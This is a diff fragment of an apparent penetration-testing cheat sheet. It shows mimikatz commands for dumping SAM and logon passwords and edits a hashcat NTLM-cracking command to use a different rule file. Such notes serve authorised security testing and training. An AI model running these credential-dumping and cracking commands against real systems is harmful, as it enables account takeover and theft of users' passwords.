@@ -103,7 +103,7 @@ mimikatz> lsadump::sam
 mimikatz> sekurlsa::logonpasswords
 
 # Run hashcat against hashes
-kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
 ```
 ## Net-NTLMv2
 ```powershell
